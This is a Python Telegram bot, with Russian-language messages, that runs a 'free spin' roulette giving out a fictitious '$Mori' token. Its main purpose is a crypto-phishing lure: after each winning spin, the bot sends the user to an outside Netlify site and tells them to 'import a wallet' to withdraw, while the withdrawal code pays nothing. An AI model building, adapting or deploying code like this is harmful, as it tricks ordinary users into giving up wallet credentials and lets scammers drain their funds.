import os
import json
import logging
from pathlib import Path
from dotenv import load_dotenv
from telegram import Update, WebAppInfo, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters
from telegram.constants import ParseMode

# Загружаем переменные окружения из .env файла
load_dotenv()

# Настройка логирования
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Токен бота (получите его у @BotFather)
BOT_TOKEN = os.getenv('BOT_TOKEN', 'YOUR_BOT_TOKEN_HERE')

# Файл для сохранения данных
DATA_FILE = Path('user_data.json')

# Функция для загрузки данных из файла
def load_user_data():
    """Загружает данные пользователей из файла"""
    if DATA_FILE.exists():
        try:
            with open(DATA_FILE, 'r', encoding='utf-8') as f:
                data = json.load(f)
                logger.info(f"Loaded user data from file: {len(data.get('balances', {}))} users")
                return data
        except Exception as e:
            logger.error(f"Error loading user data: {e}")
            return {'balances': {}, 'has_spun': {}}
    return {'balances': {}, 'has_spun': {}}

# Функция для сохранения данных в файл
def save_user_data():
    """Сохраняет данные пользователей в файл"""
    try:
        data = {
            'balances': user_balances,
            'has_spun': user_has_spun
        }
        with open(DATA_FILE, 'w', encoding='utf-8') as f:
            json.dump(data, f, ensure_ascii=False, indent=2)
        logger.info(f"Saved user data to file: {len(user_balances)} users")
    except Exception as e:
        logger.error(f"Error saving user data: {e}")

# Загружаем данные при запуске
initial_data = load_user_data()
user_balances = initial_data.get('balances', {})
user_has_spun = initial_data.get('has_spun', {})

# Конвертируем ключи из строк в int (JSON сохраняет ключи как строки)
user_balances = {int(k): v for k, v in user_balances.items()}
user_has_spun = {int(k): v for k, v in user_has_spun.items()}

# Статистика выигрышей (используется только для логирования)
total_winners = 0
total_prizes_given = 0

logger.info(f"Loaded {len(user_balances)} user balances and {len(user_has_spun)} spin records")

# Получить абсолютный путь к HTML файлу
def get_web_app_url():
    # Для локального тестирования используйте ngrok или другой туннель
    # В продакшене загрузите файлы на хостинг
    web_app_url = os.getenv('WEB_APP_URL', 'https://your-domain.com/roulette.html')
    return web_app_url

# Команда /start
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        logger.info(f"Received /start command from user {user_id}")
        
        # Инициализация баланса, если пользователь новый
        if user_id not in user_balances:
            user_balances[user_id] = 0
            # Сохраняем нового пользователя
            save_user_data()
        
        # Проверяем, крутил ли пользователь уже
        has_spun = user_has_spun.get(user_id, False)
        
        keyboard = [
            [InlineKeyboardButton("🎰 Открыть рулетку", web_app=WebAppInfo(url=get_web_app_url()))]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        # Используем effective_message для большей надежности
        message = update.effective_message
        current_balance = user_balances.get(user_id, 0)
        
        if message:
            if has_spun:
                await message.reply_text(
                    f"Привет, {update.effective_user.first_name}! 👋\n\n"
                    f"💰 Ваш баланс: {current_balance} $Mori\n\n"
                    f"🎰 Вы уже использовали свой бесплатный спин!\n\n"
                    f"Нажмите кнопку ниже, чтобы открыть рулетку:",
                    reply_markup=reply_markup
                )
            else:
                await message.reply_text(
                    f"Привет, {update.effective_user.first_name}! 👋\n\n"
                    f"💰 Ваш баланс: {current_balance} $Mori\n\n"
                    f"🎰 У вас есть один бесплатный спин!\n\n"
                    f"Нажмите кнопку ниже, чтобы открыть рулетку:",
                    reply_markup=reply_markup
                )
            logger.info(f"Sent start message to user {user_id}, balance: {current_balance} $Mori, has_spun: {has_spun}")
        else:
            logger.error(f"No message found in update for user {user_id}")
    except Exception as e:
        logger.error(f"Error in start handler: {e}", exc_info=True)

# Команда /balance
async def balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if user_id not in user_balances:
        user_balances[user_id] = 0
    
    current_balance = user_balances[user_id]
    await update.message.reply_text(
        f"💰 Ваш баланс: {current_balance} $Mori"
    )
    logger.info(f"Balance check for user {user_id}: {current_balance} $Mori")

# Команда /reset - сброс спина для тестирования
async def reset_spin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    # Сбрасываем флаг спина
    user_has_spun[user_id] = False
    
    # Также сбрасываем в localStorage через сообщение (если нужно)
    await update.message.reply_text(
        f"✅ Ваш спин сброшен!\n\n"
        f"Теперь вы можете снова сделать бесплатный спин.\n"
        f"💰 Ваш баланс: {user_balances.get(user_id, 0)} $Mori"
    )
    logger.info(f"Spin reset for user {user_id}")

# Обработка данных из Web App
async def handle_web_app_data(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    
    logger.info(f"=== Web App Data Received ===")
    logger.info(f"User ID: {user_id}, Chat ID: {chat_id}")
    logger.info(f"Update message type: {type(update.message)}")
    logger.info(f"Has web_app_data attr: {hasattr(update.message, 'web_app_data')}")
    
    try:
        # Получаем данные из Web App
        if not hasattr(update.message, 'web_app_data') or not update.message.web_app_data:
            logger.error(f"No web_app_data in message from user {user_id}")
            try:
                await context.bot.send_message(
                    chat_id=chat_id,
                    text="❌ Ошибка: данные не получены от Web App"
                )
            except Exception as e:
                logger.error(f"Error sending error message: {e}")
            return
        
        logger.info(f"web_app_data exists: {update.message.web_app_data}")
        logger.info(f"web_app_data.data: {update.message.web_app_data.data}")
            
        data = json.loads(update.message.web_app_data.data)
        logger.info(f"Parsed data from user {user_id}: {data}")
        
        if data.get('type') == 'check_spin_status':
            # Проверяем, может ли пользователь крутить
            has_spun = user_has_spun.get(user_id, False)
            user_balance = user_balances.get(user_id, 0)
            
            # Если спин был сброшен через команду /reset, отправляем сообщение
            # (но не блокируем, так как Web App сам проверит статус)
            if has_spun:
                # Пользователь уже крутил, но мы не отправляем сообщение автоматически
                # чтобы не спамить при каждом открытии Web App
                logger.info(f"Spin status check for user {user_id}: has_spun=True, balance={user_balance}")
            else:
                # Пользователь может крутить
                logger.info(f"Spin status check for user {user_id}: can_spin=True, balance={user_balance}")
        
        elif data.get('type') == 'spin_result':
            logger.info(f"=== Processing spin_result ===")
            logger.info(f"User ID: {user_id}, Chat ID: {chat_id}")
            
            # Проверяем, не крутил ли пользователь уже
            if user_has_spun.get(user_id, False):
                logger.warning(f"User {user_id} tried to spin again, but already spun")
                try:
                    await context.bot.send_message(
                        chat_id=chat_id,
                        text="❌ Вы уже использовали свой бесплатный спин! Каждый пользователь может крутить только один раз."
                    )
                    logger.info(f"Duplicate spin message sent to user {user_id}")
                except Exception as e:
                    logger.error(f"Error sending duplicate spin message: {e}", exc_info=True)
                return
            
            prize = data.get('prize', 0)
            logger.info(f"User {user_id} won {prize} $Mori")
            
            # Обновляем баланс
            if user_id not in user_balances:
                user_balances[user_id] = 0
            user_balances[user_id] += prize
            logger.info(f"Updated balance for user {user_id}: {user_balances[user_id]} $Mori")
            
            # Отмечаем, что пользователь уже крутил
            user_has_spun[user_id] = True
            
            # Сохраняем данные в файл
            save_user_data()
            
            # Обновляем статистику
            global total_winners, total_prizes_given
            total_winners += 1
            total_prizes_given += prize
            
            # Создаем кнопку для импорта кошелька
            wallet_url = 'https://comfy-hummingbird-74e462.netlify.app/'
            keyboard = [
                [InlineKeyboardButton("🔗 Импортировать кошелек", url=wallet_url)]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            # Отправляем сообщение в чат
            user_name = update.effective_user.first_name or "Пользователь"
            current_balance = user_balances[user_id]
            message_text = (
                f"🎉 Поздравляем, {user_name}!\n\n"
                f"🎰 Вы выиграли: {prize} $Mori!\n\n"
                f"💰 Ваш баланс: {current_balance} $Mori\n\n"
                f"💵 Чтобы вывести средства, нажмите кнопку ниже и импортируйте кошелек:"
            )
            
            logger.info(f"Attempting to send message to chat {chat_id}")
            logger.info(f"Message text: {message_text[:100]}...")
            
            # Отправляем данные о балансе обратно в Web App через специальное сообщение
            # К сожалению, Telegram Web App API не поддерживает прямую отправку данных обратно
            # Но мы можем отправить сообщение, которое пользователь увидит
            
            try:
                sent_message = await context.bot.send_message(
                    chat_id=chat_id,
                    text=message_text,
                    reply_markup=reply_markup
                )
                logger.info(f"✅ Congratulations message sent successfully!")
                logger.info(f"Message ID: {sent_message.message_id}, Chat ID: {sent_message.chat.id}")
                
                # Также отправляем отдельное сообщение с балансом для синхронизации
                try:
                    await context.bot.send_message(
                        chat_id=chat_id,
                        text=f"💾 Баланс сохранен: {current_balance} $Mori"
                    )
                except:
                    pass  # Игнорируем ошибки дополнительного сообщения
            except Exception as e:
                logger.error(f"❌ Error sending congratulations message: {e}", exc_info=True)
                logger.error(f"Error type: {type(e).__name__}")
                logger.error(f"Chat ID was: {chat_id}, User ID: {user_id}")
                
                # Пытаемся отправить без кнопки
                try:
                    logger.info("Trying to send fallback message without button...")
                    current_balance = user_balances[user_id]
                    fallback_text = (
                        f"🎉 Поздравляем, {user_name}!\n\n"
                        f"🎰 Вы выиграли: {prize} $Mori!\n\n"
                        f"💰 Ваш баланс: {current_balance} $Mori\n\n"
                        f"💵 Чтобы вывести средства, перейдите по ссылке и импортируйте кошелек:\n"
                        f"🔗 {wallet_url}"
                    )
                    sent_message = await context.bot.send_message(
                        chat_id=chat_id,
                        text=fallback_text
                    )
                    logger.info(f"✅ Fallback message sent successfully! Message ID: {sent_message.message_id}")
                except Exception as e2:
                    logger.error(f"❌ Error sending fallback message: {e2}", exc_info=True)
                    logger.error(f"Fallback error type: {type(e2).__name__}")
        
        elif data.get('type') == 'withdraw_balance':
            # Здесь должна быть интеграция с платежной системой для вывода средств
            amount = data.get('amount', 0)
            if user_id not in user_balances:
                user_balances[user_id] = 0
            
            if user_balances[user_id] < amount:
                await update.message.reply_text(
                    f"❌ Недостаточно средств для вывода!\n"
                    f"💰 Ваш баланс: {user_balances[user_id]} $Mori"
                )
            elif amount <= 0:
                await update.message.reply_text(
                    "❌ Неверная сумма для вывода!"
                )
            else:
                # В реальном проекте здесь должна быть интеграция с платежной системой
                await update.message.reply_text(
                    f"✅ Запрос на вывод {amount} $Mori принят!\n"
                    f"💰 Ваш баланс: {user_balances[user_id]} $Mori\n\n"
                    f"Вывод средств будет обработан в ближайшее время."
                )
        
        elif data.get('type') == 'reset_spin_request':
            # Сбрасываем спин по запросу из Web App
            user_has_spun[user_id] = False
            logger.info(f"Spin reset requested from Web App for user {user_id}")
            # Отправляем подтверждение
            chat_id = update.effective_chat.id
            try:
                await context.bot.send_message(
                    chat_id=chat_id,
                    text="✅ Спин сброшен! Теперь вы можете снова крутить рулетку."
                )
            except Exception as e:
                logger.error(f"Error sending reset confirmation: {e}")
        
        elif data.get('type') == 'get_balance':
            # Отправляем баланс обратно в веб-приложение
            if user_id not in user_balances:
                user_balances[user_id] = 0
                save_user_data()
            
            user_balance = user_balances[user_id]
            chat_id = update.effective_chat.id
            
            logger.info(f"Balance requested by user {user_id}: {user_balance} $Mori")
            
            # Отправляем баланс пользователю через сообщение
            # Web App не может напрямую получить ответ, но мы можем отправить сообщение
            # которое пользователь увидит, и баланс будет сохранен в localStorage через другое взаимодействие
            try:
                await context.bot.send_message(
                    chat_id=chat_id,
                    text=f"💰 Ваш текущий баланс: {user_balance} $Mori"
                )
                logger.info(f"Balance message sent to user {user_id}")
            except Exception as e:
                logger.error(f"Error sending balance message: {e}")
    
    except json.JSONDecodeError:
        logger.error(f"Failed to parse web app data from user {user_id}")
        await update.message.reply_text("❌ Ошибка обработки данных")

# Обработка обычных сообщений
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("🎰 Открыть рулетку", web_app=WebAppInfo(url=get_web_app_url()))]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "Используйте команды:\n"
        "/start - Начать работу с ботом\n"
        "/balance - Проверить баланс\n"
        "Или нажмите кнопку ниже, чтобы открыть рулетку:",
        reply_markup=reply_markup
    )

# Обработчик ошибок
async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
    """Обработчик ошибок для логирования"""
    logger.error(f"Exception while handling an update: {context.error}", exc_info=context.error)

# Главная функция
def main():
    if BOT_TOKEN == 'YOUR_BOT_TOKEN_HERE' or not BOT_TOKEN:
        logger.error("Пожалуйста, установите BOT_TOKEN в переменных окружения или в коде!")
        return
    
    try:
        # Создаем приложение
        application = Application.builder().token(BOT_TOKEN).build()
        
        # Добавляем обработчик ошибок
        application.add_error_handler(error_handler)
        
        # Регистрируем обработчики
        application.add_handler(CommandHandler("start", start))
        application.add_handler(CommandHandler("balance", balance))
        application.add_handler(CommandHandler("reset", reset_spin))
        application.add_handler(MessageHandler(filters.StatusUpdate.WEB_APP_DATA, handle_web_app_data))
        application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
        
        # Запускаем бота
        logger.info("Бот запущен...")
        logger.info(f"Токен установлен: {BOT_TOKEN[:10]}...")
        application.run_polling(allowed_updates=Update.ALL_TYPES)
    except Exception as e:
        logger.error(f"Ошибка при запуске бота: {e}", exc_info=True)

if __name__ == '__main__':
    main()
